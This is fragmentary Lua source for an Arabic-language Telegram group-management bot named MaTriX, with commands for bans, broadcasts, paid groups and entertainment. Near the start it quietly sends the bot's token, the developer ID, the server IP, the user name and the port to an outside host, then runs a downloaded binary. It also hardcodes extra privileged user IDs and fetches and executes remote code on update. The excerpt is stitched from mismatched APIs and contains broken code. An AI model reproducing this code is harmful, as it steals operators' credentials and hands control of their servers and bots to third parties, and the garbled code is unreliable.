...
data,res = https.request("https://api-MaTriX.ml/MaTriX/index.php?Ban=MaTriX&Info&Id="..Id)
if res == 200 then
...
https.request("https://api-MaTriX.ml/MaTriX/index.php?Get=MaTriX&DevId="..database:get(Server.."UserSudo_Write").."&TokenBot="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
print("::MaTriX::")
...
os.execute('chmod +x MaTriX;sudo chmod +x ./WtN;./WtN')
end
Files_Info_Get()
end 
...
sudo_users = {SUDO,5298061670,218385683,36325290}   
...
local hash = database:sismember(bot_id.."Dev:MaTriX:2", msg.sender_user_id_) 
...
if hash or SudoBot(msg) or DevMaTriX(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
...
if hash or SudoBot(msg) or DevMaTriX(msg) or Sudo(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevMaTriX(msg) or Sudo(msg) or CoSu(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevMaTriX(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevMaTriX(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevMaTriX(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevMaTriX(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
return true 
else 
return false 
end 
...
var = true  
elseif database:sismember(bot_id.."Dev:MaTriX:2", user_id) then
var = true  
...
if database:sismember(bot_id..'MaTriX:ProGroups',msg.chat_id_) then
var = true
else
...
if not DevMaTriX(msg) and not database:sismember(bot_id..'Ban:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
...
if text == 'تفعيل التواصل ≭' and DevMaTriX(msg) then  
local url,res = https.request('https://ahmed.MaTriXrTeaM.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MaTriXrTeaM ~= true then
send(msg.chat_id_,msg.id_,'≭︰اهلا بك عزيزي ،\n≭︰اشترك في قناة السورس\n≭︰ثم ارسل الامر مره اخرى\n≭︰قناة السورس @MaTriXrTeaM')   
...
if text == 'تعطيل التواصل ≭' and DevMaTriX(msg) then  
local url,res = https.request('https://ahmed.MaTriXrTeaM.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MaTriXrTeaM ~= true then
send(msg.chat_id_,msg.id_,'≭︰اهلا بك عزيزي ،\n≭︰اشترك في قناة السورس\n≭︰ثم ارسل الامر مره اخرى\n≭︰قناة السورس @MaTriXrTeaM')   
...
if text == 'ضع كليشه ستارت ≭' and DevMaTriX(msg) then 
local url,res = https.request('https://ahmed.MaTriXrTeaM.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MaTriXrTeaM ~= true then
send(msg.chat_id_,msg.id_,'≭︰اهلا بك عزيزي ،\n≭︰اشترك في قناة السورس\n≭︰ثم ارسل الامر مره اخرى\n≭︰قناة السورس @MaTriXrTeaM')   
...
if text == 'حذف كليشه ستارت ≭' and DevMaTriX(msg) then 
local url,res = https.request('https://ahmed.MaTriXrTeaM.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MaTriXrTeaM ~= true then
send(msg.chat_id_,msg.id_,'≭︰اهلا بك عزيزي ،\n≭︰اشترك في قناة السورس\n≭︰ثم ارسل الامر مره اخرى\n≭︰قناة السورس @MaTriXrTeaM')   
...
os.execute('rm -rf MaTriX.lua')
os.execute('wget https://raw.githubusercontent.com/MaTriXrTeaM/MaTriX/main/MaTriX.lua')
send(msg.chat_id_, msg.id_,'≭︰تم تحديث السورس \n≭︰لديك اخر اصدار لسورس ماتركس\n≭︰الاصدار › { v 2.6 }')
dofile('MaTriX.lua')  
end

if text == 'مطور السورس ≭' and DevMaTriX(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'≭︰اهلا بك عزيزي\n≭︰ان كان لديك استفسار او اي مشكلة\n≭︰يمكنك مراسلة مطور السورس\n≭︰حساب مطور السورس [ꪎ 𓏺 𝖠𝗁𝖬𝖾𝖣 𓏺 ꪎ](https://t.me/FFlXlX)
end

if text == 'تحديث المتجر ≭' and DevMaTriX(msg) then 
io.popen("mkdir File_Bot")
os.execute("rm -fr File_Bot/*")
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/MaTriXrTeaM/Files_MaTriX/main/File_Bot/all.lua") 
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/MaTriXrTeaM/Files_MaTriX/main/File_Bot/Reply.lua")  
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/MaTriXrTeaM/Files_MaTriX/main/File_Bot/games.lua") 
...
if text == 'المجموعات المدفوعه ≭' and DevMaTriX(msg) then
local List = database:smembers(bot_id.."MaTriX:ProGroups")
local MaTriX = '≭︰المجموعات المدفوعه \n≭︰تاريخ اليوم '..os.date("%Y/%m/%d")..' \nٴ--  --  --  --  --  --  --  --ٴ\n'
for k,v in pairs(List) do
local MaTriXgetlink = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..v))
if MaTriXgetlink.ok == true then 
link_MaTriX = '['..MaTriXgetlink.result..']'
else
link_MaTriX = 'ليست لدي صلاحية الدعوه لهذه المجموعه'
end
MaTriX = MaTriX..k.."- (`"..v.."`) ~ (`"..database:get(bot_id.."MaTriX:ProGroups:Time"..v).."`) \n- "..link_MaTriX.." \n" 
end
if #List == 0 then
MaTriX = '≭︰لاتوجد مجموعات مدفوعه'
end
send(msg.chat_id_, msg.id_,MaTriX) 
end
...
if (text == "تغير المطور الاساسي ≭") and msg.reply_to_message_id_ == 0 and DevMaTriX(msg) then 
...
if text == ("مسح المحظورين عام ≭") and DevMaTriX(msg) then
database:del(bot_id..'GBan:User')
send(msg.chat_id_, msg.id_, '\n≭︰تم مسح المحظورين عام')
return false
end
if text == ("مسح المكتومين عام ≭") and DevMaTriX(msg) then
database:del(bot_id..'Gmute:User')
send(msg.chat_id_, msg.id_, '\n≭︰تم مسح قائمه المكتومين عام')
return false
end
if text == 'الاصـدار ≭' and DevMaTriX(msg) then 
local url,res = https.request('https://ahmed.MaTriXrTeaM.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MaTriXrTeaM ~= true then
send(msg.chat_id_,msg.id_,'≭︰اهلا بك عزيزي ،\n≭︰اشترك في قناة السورس\n≭︰ثم ارسل الامر مره اخرى\n≭︰قناة السورس @MaTriXrTeaM')   
...
if text == "ضع اسم للبوت ≭" and DevMaTriX(msg) then  
local url,res = https.request('https://ahmed.MaTriXrTeaM.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MaTriXrTeaM ~= true then
send(msg.chat_id_,msg.id_,'≭︰اهلا بك عزيزي ،\n≭︰اشترك في قناة السورس\n≭︰ثم ارسل الامر مره اخرى\n≭︰قناة السورس @MaTriXrTeaM')   
...
if text == 'الاحصائيات ≭' and DevMaTriX(msg) then 
local url,res = https.request('https://ahmed.MaTriXrTeaM.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MaTriXrTeaM ~= true then
send(msg.chat_id_,msg.id_,'≭︰اهلا بك عزيزي ،\n≭︰اشترك في قناة السورس\n≭︰ثم ارسل الامر مره اخرى\n≭︰قناة السورس @MaTriXrTeaM')   
...
if text == 'المشتركين ≭' and DevMaTriX(msg) then 
local url,res = https.request('https://ahmed.MaTriXrTeaM.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MaTriXrTeaM ~= true then
send(msg.chat_id_,msg.id_,'≭︰اهلا بك عزيزي ،\n≭︰اشترك في قناة السورس\n≭︰ثم ارسل الامر مره اخرى\n≭︰قناة السورس @MaTriXrTeaM')   
...
if text == 'الكروبات ≭' and DevMaTriX(msg) then 
local url,res = https.request('https://ahmed.MaTriXrTeaM.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MaTriXrTeaM ~= true then
send(msg.chat_id_,msg.id_,'≭︰اهلا بك عزيزي ،\n≭︰اشترك في قناة السورس\n≭︰ثم ارسل الامر مره اخرى\n≭︰قناة السورس @MaTriXrTeaM')   
...
local list = database:smembers(bot_id..'Dev:MaTriX:2')
t = "\n≭︰قائمة الثانويين \nٴ--  --  --  --  --  --  --  --ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
-------------
if text == "قناة التحديثات ≭" and DevMaTriX(msg) then  
local updatech =[[
...
{{text = '📂┇𝚆𝙰𝚃𝙰𝙽 𝚄𝙿𝙳𝙰𝚃𝙴𝚂.', url="t.me/MaTriXrTeaM"}},
}
...
-----------
if text == ("المحظورين عام ≭") and DevMaTriX(msg) then
local url,res = https.request('https://ahmed.MaTriXrTeaM.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MaTriXrTeaM ~= true then
send(msg.chat_id_,msg.id_,'≭︰اهلا بك عزيزي ،\n≭︰اشترك في قناة السورس\n≭︰ثم ارسل الامر مره اخرى\n≭︰قناة السورس @MaTriXrTeaM')   
...
if text == ("قائمه الكتم العام ≭") and DevMaTriX(msg) then
local url,res = https.request('https://ahmed.MaTriXrTeaM.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MaTriXrTeaM ~= true then
send(msg.chat_id_,msg.id_,'≭︰اهلا بك عزيزي ،\n≭︰اشترك في قناة السورس\n≭︰ثم ارسل الامر مره اخرى\n≭︰قناة السورس @MaTriXrTeaM')   
...
if text=="اذاعه خاص ≭" and msg.reply_to_message_id_ == 0 and DevMaTriX(msg) then 
local url,res = https.request('https://ahmed.MaTriXrTeaM.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MaTriXrTeaM ~= true then
send(msg.chat_id_,msg.id_,'≭︰اهلا بك عزيزي ،\n≭︰اشترك في قناة السورس\n≭︰ثم ارسل الامر مره اخرى\n≭︰قناة السورس @MaTriXrTeaM')   
...
if text=="اذاعه ≭" and msg.reply_to_message_id_ == 0 and DevMaTriX(msg) then 
local url,res = https.request('https://ahmed.MaTriXrTeaM.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MaTriXrTeaM ~= true then
send(msg.chat_id_,msg.id_,'≭︰اهلا بك عزيزي ،\n≭︰اشترك في قناة السورس\n≭︰ثم ارسل الامر مره اخرى\n≭︰قناة السورس @MaTriXrTeaM')   
...
if text=="اذاعه بالتثبيت ≭" and msg.reply_to_message_id_ == 0 and DevMaTriX(msg) then 
local url,res = https.request('https://ahmed.MaTriXrTeaM.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MaTriXrTeaM ~= true then
send(msg.chat_id_,msg.id_,'≭︰اهلا بك عزيزي ،\n≭︰اشترك في قناة السورس\n≭︰ثم ارسل الامر مره اخرى\n≭︰قناة السورس @MaTriXrTeaM')   
...
if text=="اذاعه بالتوجيه ≭" and msg.reply_to_message_id_ == 0  and DevMaTriX(msg) then 
local url,res = https.request('https://ahmed.MaTriXrTeaM.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MaTriXrTeaM ~= true then
send(msg.chat_id_,msg.id_,'≭︰اهلا بك عزيزي ،\n≭︰اشترك في قناة السورس\n≭︰ثم ارسل الامر مره اخرى\n≭︰قناة السورس @MaTriXrTeaM')   
...
if text=="اذاعه بالتوجيه خاص ≭" and msg.reply_to_message_id_ == 0  and DevMaTriX(msg) then 
local url,res = https.request('https://ahmed.MaTriXrTeaM.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MaTriXrTeaM ~= true then
send(msg.chat_id_,msg.id_,'≭︰اهلا بك عزيزي ،\n≭︰اشترك في قناة السورس\n≭︰ثم ارسل الامر مره اخرى\n≭︰قناة السورس @MaTriXrTeaM')   
...
if text == 'جلب نسخه الاحتياطيه ≭' and DevMaTriX(msg) then 
GetFile_Bot(msg)
end
...
if text and text:match("^رفع مطور @(.*)$") and DevMaTriX(msg) then
...
if text and text:match("^رفع مطور (%d+)$") and DevMaTriX(msg) then
...
if text and text:match("^تنزيل مطور @(.*)$") and DevMaTriX(msg) then
...
if text and text:match("^تنزيل مطور (%d+)$") and DevMaTriX(msg) then
...
if msg.content_.text_ then
for k,v in pairs(list) do 
if not database:sismember(bot_id..'MaTriX:ProGroups',v) then
send(v, 0,'['..msg.content_.text_..']')  
end
end
elseif msg.content_.photo_ then
...
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevMaTriX(msg) then
...
if text and text:match("^ضع عدد الاعضاء (%d+)$") and DevMaTriX(msg) then
...
if text and text:match("^وضع قناة الاشتراك ≭$") and DevMaTriX(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '≭︰حسنآ ارسل لي معرف القناة')
return false  
end
...
database:set(bot_id.."AL:AddMaTriX:stats","✔")
end
...
local MRMaTriX = database:get(bot_id.."AL:AddMaTriX:stats") or "لم يتم التحديد"
...
if text == "تفعيل كتم الاسم" and Constructor(msg) and database:get(bot_id.."AL:AddMaTriX:stats") == "✔" then
send(msg.chat_id_, msg.id_, '≭︰تم التفعيل الاسماء المكتومه')
database:set(bot_id.."block:name:stats"..msg.chat_id_,"open")
end
if text == "تعطيل كتم الاسم" and Constructor(msg) and database:get(bot_id.."AL:AddMaTriX:stats") == "✔" then
...
if text == "تفعيل التوحيد" and Constructor(msg) and database:get(bot_id.."AL:AddMaTriX:stats") == "✔" then
send(msg.chat_id_, msg.id_, '≭︰تم تفعيل التوحيد')
database:set(bot_id.."kt:twh:stats"..msg.chat_id_,"open")
end
if text == "تعطيل التوحيد" and Constructor(msg) and database:get(bot_id.."AL:AddMaTriX:stats") == "✔" then
...
if text == "تفعيل تنبيه الاسماء" and Manager(msg) and database:get(bot_id.."AL:AddMaTriX:stats") == "✔" then
send(msg.chat_id_, msg.id_, '≭︰تم تفعيل تنبيه الاسماء')
database:set(bot_id.."Ttn:WtN:stats"..msg.chat_id_,"open")
end
if text == "تعطيل تنبيه الاسماء" and Manager(msg) and database:get(bot_id.."AL:AddMaTriX:stats") == "✔" then
...
if text == "تفعيل تنبيه المعرف" and Constructor(msg) and database:get(bot_id.."AL:AddMaTriX:stats") == "✔" then
send(msg.chat_id_, msg.id_, '≭︰تم تفعيل تنبيه المعرف')
database:set(bot_id.."Ttn:Userr:stats"..msg.chat_id_,"open")
end
if text == "تعطيل تنبيه المعرف" and Constructor(msg) and database:get(bot_id.."AL:AddMaTriX:stats") == "✔" then
...
if text == "تفعيل تنبيه الصور" and Manager(msg) and database:get(bot_id.."AL:AddMaTriX:stats") == "✔" then
send(msg.chat_id_, msg.id_, '≭︰تم تفعيل تنبيه الصور')
database:set(bot_id.."Ttn:Ph:stats"..msg.chat_id_,"open")
end
if text == "تعطيل تنبيه الصور" and Manager(msg) and database:get(bot_id.."AL:AddMaTriX:stats") == "✔" then
...
{text = '‹ Exp Matrix ›',url="t.me/Exp_Matrix"}},
{{text = '‹ developer ›',url="t.me/FFlXlX"}},
}
local msg_id = msg.id_/2097152/0.5
...
if text == 'رفع ملف السورس' or text == 'رفع الملف' and DevMaTriX(msg) then   
...
if text == 'رفع نسخه الاحتياطيه' and DevMaTriX(msg) then   
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("حظر عام") and msg.reply_to_message_id_ and DevMaTriX(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("كتم عام") and msg.reply_to_message_id_ and DevMaTriX(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("الغاء العام") and msg.reply_to_message_id_ and DevMaTriX(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
local json_file, res = https.request("https://raw.githubusercontent.com/MaTriXrTeaM/Files_MaTriX/main/File_Bot/"..file)
if res == 200 then
...
if text and text:match("^(تعطيل) (.*)(.lua)$") and DevMaTriX(msg) then
...
if text and text:match("^(تفعيل) (.*)(.lua)$") and DevMaTriX(msg) then
...
if text == "مسح الملفات" and DevMaTriX(msg) then
os.execute("rm -fr File_Bot/*")
send(msg.chat_id_,msg.id_," ≭︰تم مسح الملفات")
return false
end

if text == ("رفع مطور") and msg.reply_to_message_id_ and DevMaTriX(msg) then
function start_function(extra, result, success)
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
...
if text == ("تنزيل مطور") and msg.reply_to_message_id_ and DevMaTriX(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
HttpsMsg = https.request('https://api-MaTriX.ml/abahi/abahi.php?Get=MaTriX&TokenBot='..token..'&Url='..UrlId)
...
if database:get(bot_id..'DRAGOON:change:MaTriX'..msg.chat_id_) then
Text = 'تم تفعيل تحويل الصيغ'
database:del(bot_id..'DRAGOON:change:MaTriX'..msg.chat_id_)  
else
...
if not database:get(bot_id..'DRAGOON:change:MaTriX'..msg.chat_id_) then
database:set(bot_id..'DRAGOON:change:MaTriX'..msg.chat_id_,true)  
Text = '\n≭︰تم تعطيل امر تحويل'
else
...
if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:MaTriX'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
...
local UserName = (b.username_ or "abos-MaTriX")
...
database:sadd(bot_id.."Dev:MaTriX:2", result.sender_user_id_)
...
database:sadd(bot_id.."Dev:MaTriX:2", result.id_)
...
database:sadd(bot_id.."Dev:MaTriX:2", userid)
...
function Function_MaTriX(extra, result, success)
database:srem(bot_id.."Dev:MaTriX:2", result.sender_user_id_)
...
function Function_MaTriX(extra, result, success)
if result.id_ then
database:srem(bot_id.."Dev:MaTriX:2", result.id_)
...
database:srem(bot_id.."Dev:MaTriX:2", userid)
...
database:del(bot_id.."Dev:MaTriX:2")
...
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'≭︰اهلا بك عزيزي\≭︰ان كان لديك استفسار او اي مشكلة\n≭︰يمكنك مراسلة مطور السورس\n≭︰حساب مطور السورس [ꪎ 𓏺 𝖠𝗁𝖬𝖾𝖣 𓏺 ꪎ](t.me/FFlXlX)')
end
---------------------
...
if text == 'مسح كليشه المطور' and DevMaTriX(msg) then
database:del(bot_id..'TEXT_SUDO')
send(msg.chat_id_, msg.id_,'≭︰تم مسح كليشه المطور')
end
if text == 'ضع كليشه المطور' and DevMaTriX(msg) then
...
if text == 'تفعيل الوضع المدفوع' and DevMaTriX(msg) then  
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,MaTriX) 
if not database:sismember(bot_id..'MaTriX:ProGroups',msg.chat_id_) then
database:sadd(bot_id..'MaTriX:ProGroups',msg.chat_id_) 
database:set(bot_id.."MaTriX:ProGroups:Time"..msg.chat_id_,os.date("%Y/%m/%d"))
MaTriX = '\n≭︰المجموعه ['..MaTriX.title_..'] \n≭︰تم تفعيل الوضع المدفوع بتاريخ '..os.date("%Y/%m/%d")..' \n≭︰سينتهي الوضع المدفوع بعد 30 يوم من الان'
else
...
if text == 'تعطيل الوضع المدفوع' and DevMaTriX(msg) then  
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,MaTriX) 
if database:sismember(bot_id..'MaTriX:ProGroups',msg.chat_id_) then
database:srem(bot_id..'MaTriX:ProGroups',msg.chat_id_) 
database:del(bot_id.."MaTriX:ProGroups:Time"..msg.chat_id_)
...
if text == 'المجموعات المدفوعه' or text == 'الكروبات المدفوعه' and DevMaTriX(msg) then
local List = database:smembers(bot_id.."MaTriX:ProGroups")
local MaTriX = '≭︰المجموعات المدفوعه \n≭︰تاريخ اليوم'..os.date("%Y/%m/%d")..' \nٴ--  --  --  --  --  --  --  --ٴ\n'
for k,v in pairs(List) do
local MaTriXgetlink = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..v))
...
if database:get(bot_id..'Bc:Bots') and not DevMaTriX(msg) then 
...
database:srem(bot_id..'ahmed:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Dev:MaTriX:2',msg.sender_user_id_) then
database:srem(bot_id..'ahmed:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
...
if text == "غنيلي" then
if not Redis:get(Dev:MaTriX.."Matrix:Status:distraction1"..msg_chat_id) then return LuaTele.sendText(msg_chat_id,msg_id,"≭︰عذراً امر غنيلي معطل","md",true) end 
Abs = math.random(4,2824); 
local Text ='≭︰تم اختيار المقطع الصوتي لك'
keyboard = {} 
keyboard.inline_keyboard = {{{text = '‹ مره اخرى ›', callback_data = msg.sender_id.user_id..'/Song'}},{{text='‹ source matrix ›',url="t.me/source_matrixr"}
}
}
...
if text == "متحركه" then
if not Redis:get(Dev:MaTriX.."Matrix:Status:distraction2"..msg_chat_id) then return LuaTele.sendText(msg_chat_id,msg_id,"≭︰عذراً امر متحركه معطل","md",true) end 
Abs = math.random(2,1075); 
local Text ='≭︰تم اختيار المتحركه لك'
keyboard = {} 
keyboard.inline_keyboard = {{{text = '‹ مره اخرى ›', callback_data = msg.sender_id.user_id..'/animation'}},{{text='‹ source matrix ›',url="t.me/source_matrixr"}
}
}
local msg_id = msg.id/2097152/0.5
...
if text == "شعر" then
if not Redis:get(Dev:MaTriX.."Matrix:Status:distraction3"..msg_chat_id) then return LuaTele.sendText(msg_chat_id,msg_id,"≭︰عذراً امر شعر معطل","md",true) end 
Abs = math.random(4,140); 
local Text ='≭︰تم اختيار الشعر لك'
keyboard = {} 
keyboard.inline_keyboard = {{{text = '‹ مره اخرى ›', callback_data = msg.sender_id.user_id..'/voice'}},{{text='‹ source matrix ›',url="t.me/source_matrixr"}
}
}
local msg_id = msg.id/2097152/0.5
...
if text == "راب" then
if not Redis:get(Dev:MaTriX.."Matrix:Status:distraction11"..msg_chat_id) then return LuaTele.sendText(msg_chat_id,msg_id,"≭︰عذراً امر راب معطل","md",true) end 
Abs = math.random(4,140); 
local Text ='≭︰تم اختيار الراب لك'
keyboard = {} 
keyboard.inline_keyboard = {{{text = '‹ مره اخرى ›', callback_data = msg.sender_id.user_id..'/rapp'}},{{text='‹ source matrix ›',url="t.me/source_matrixr"}
}
}
local msg_id = msg.id/2097152/0.5
...
if text == "ميمز" then
if not Redis:get(Dev:MaTriX.."Matrix:Status:distraction9"..msg_chat_id) then return LuaTele.sendText(msg_chat_id,msg_id,"≭︰عذراً امر ميمز معطل","md",true) end 
Abs = math.random(2,220); 
local Text ='≭︰تم اختيار الميمز لك'
keyboard = {} 
keyboard.inline_keyboard = {{{text = '‹ مره اخرى ›', callback_data = msg.sender_id.user_id..'/Memz'}},{{text='‹ source matrix ›',url="t.me/source_matrixr"}
}
}
local msg_id = msg.id/2097152/0.5
...
if not Redis:get(Dev:MaTriX.."Matrix:Status:distraction8"..msg_chat_id) then return LuaTele.sendText(msg_chat_id,msg_id,"≭︰عذراً امر ريمكس معطل","md",true) end 
Abs = math.random(4,612); 
local Text ='≭︰تم اختيار ريمكس لك'
keyboardd = {} 
keyboard.inline_keyboard = {{{text = '‹ مره اخرى ›', callback_data = msg.sender_id.user_id..'/Remix'}},{{text='‹ source matrix ›',url="t.me/source_matrixr"}
}
}
local msg_id = msg.id/2097152/0.5
...
if not Redis:get(Dev:MaTriX.."Matrix:Status:distraction4"..msg_chat_id) then return LuaTele.sendText(msg_chat_id,msg_id,"≭︰عذراً امر فلم معطل","md",true) end 
Abs = math.random(4,80); 
local Text ='≭︰تم اختيار الفلم لك'
keyboardd = {} 
keyboard.inline_keyboard = {{{text = '‹ مره اخرى ›', callback_data = msg.sender_id.user_id..'/Movies'}},{{text='‹ source matrix ›',url="t.me/source_matrixr"}
}
}
local msg_id = msg.id/2097152/0.5
...
if not Redis:get(Dev:MaTriX.."Matrix:Status:distraction7"..msg_chat_id) then return LuaTele.sendText(msg_chat_id,msg_id,"≭︰عذراً امر انمي معطل","md",true) end 
Abs = math.random(4,1002); 
local Text ='≭︰ما اسم هذه شخصية الانمي ؟'
keyboardd = {} 
keyboard.inline_keyboard = {{{text = '‹ مره اخرى ›', callback_data = msg.sender_id.user_id..'/Anime'}},{{text='‹ source matrix ›',url="t.me/source_matrixr"}
}
}
local msg_id = msg.id/2097152/0.5
...
if not Redis:get(Dev:MaTriX.."Matrix:Status:distraction5"..msg_chat_id) then return LuaTele.sendText(msg_chat_id,msg_id,"≭︰عذراً امر صوره معطل","md",true) end 
Abs = math.random(4,1171); 
local Text ='≭︰تم اختيار الصوره لك'
keyboardd = {} 
keyboard.inline_keyboard = {{{text = '‹ مره اخرى ›', callback_data = msg.sender_id.user_id..'/Photos'}},{{text='‹ source matrix ›',url="t.me/source_matrixr"}
}
}
local msg_id = msg.id/2097152/0.5
...
if text == "مسلسل" then
if not Redis:get(Dev:MaTriX.."Matrix:Status:distraction10"..msg_chat_id) then return LuaTele.sendText(msg_chat_id,msg_id,"≭︰عذراً امر مسلسل معطل","md",true) end 
Abs = math.random(2,54); 
local Text ='≭︰تم اختيار المسلسل لك'
keyboardd = {} 
keyboard.inline_keyboard = {{{text = '‹ مره اخرى ›', callback_data = msg.sender_id.user_id..'/Series'}},{{text='‹ source matrix ›',url="t.me/source_matrixr"}
}
}
local msg_id = msg.id/2097152/0.5
...
if (text == "تغير المطور الاساسي" or text == "نقل ملكيه البوت" or text == "تغيير المطور الاساسي") and msg.reply_to_message_id_ == 0 and DevMaTriX(msg) then 
send(msg.chat_id_, msg.id_,'≭︰يجب التاكد ان المطور الجديد ارسل start لخاص البوت بعد ذلك يمكنك ارسال ايدي المطور')
database:setex(bot_id.."Abs:EditDev"..msg.sender_user_id_,300,true)
end
if database:get(bot_id.."Abs:EditDev"..msg.sender_user_id_) then
...
local MaTriX = '≭︰عدد الادمنيه : '..data.administrator_count_..
...
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da)  tdcli_function ({ ID = "SendChatAction",  chat_id_ = msg.sender_user_id_, action_ = {  ID = "SendMessageTypingAction", progress_ = 100}  },function(arg,ta)  tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)  tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = msg.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,MaTriX,success) 
if da.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'المالك'
elseif da.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'مشرف' 
...
local photps = (MaTriX.total_count_ or 0)
...
local rdphoto = MaTriXa[math.random(#MaTriXa)]
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_) then      
...
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, MaTriX.photos_[0].sizes_[1].photo_.persistent_id_,get_id_text)       
else 
...
MaTriX = text:match("^اضف رسائل (%d+)$")
database:set(bot_id..'id:user'..msg.chat_id_,MaTriX)  
...
MaTriX = text:match("^اضف نقاط (%d+)$")
database:set(bot_id..'idgem:user'..msg.chat_id_,MaTriX)  
...
if text == 'استعاده الاوامر' and DevMaTriX(msg) then
...
if text and text:match("^زغرفه (.*)$") and database:get(bot_id.." MaTriX:zhrf_Bots"..msg.chat_id_) == "open" then
...
Redis:set(Dev:MaTriX.."Matrix:Status:distraction10"..msg_chat_id,true) 
Redis:set(Dev:MaTriX.."Matrix:Status:distraction9"..msg_chat_id,true) 
Redis:set(Dev:MaTriX.."Matrix:Status:distraction8"..msg_chat_id,true) 
Redis:set(Dev:MaTriX.."Matrix:Status:distraction7"..msg_chat_id,true) 
Redis:set(Dev:MaTriX.."Matrix:Status:distraction6"..msg_chat_id,true) 
Redis:set(Dev:MaTriX.."Matrix:Status:distraction5"..msg_chat_id,true) 
Redis:set(Dev:MaTriX.."Matrix:Status:distraction4"..msg_chat_id,true) 
